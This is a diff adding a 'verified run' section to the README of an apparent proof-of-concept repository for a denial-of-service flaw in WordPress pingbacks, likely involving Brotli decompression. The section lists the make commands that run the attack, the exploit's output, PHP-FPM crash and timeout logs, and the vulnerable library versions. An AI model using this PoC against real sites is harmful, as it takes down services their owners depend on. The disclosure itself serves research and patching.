@@ -197,6 +197,34 @@ More: [`docs/attack-chain.md`](docs/attack-chain.md).
 With `pm.max_children = 4`, four concurrent pingbacks are enough to take the
 whole pool down. The PoC sends four by default.
 
+### Verified run (2026-10-27, x86-64)
+
+```text
+$ make crash
+...
+[1] <- HTTP 502 in 2.5s
+[*] summary
+    crashed                  1
+[!] 1 request(s) look like worker crashes
+
+$ docker compose logs wordpress | grep -E 'SIGSEGV|timed out'
+WARNING: [pool www] child 49 exited on signal 11 (SIGSEGV - core dumped) after 15.590566 seconds from start
+```
+
+```text
+$ make hang
+...
+[1] <- HTTP 502 in 15.1s
+[*] summary
+    worker-killed            4
+
+WARNING: [pool www] child 50 execution timed out (15.086883 sec), terminating
+WARNING: [pool www] child 50 exited on signal 15 (SIGTERM) after 508.458186 seconds from start
+```
+
+The stack in the container was `libbrotli1 1.1.0-2+b7`, PHP 8.3.36,
+libcurl 8.14.1, Brotli feature enabled.
+
 ---
 
 ## Why no RCE?
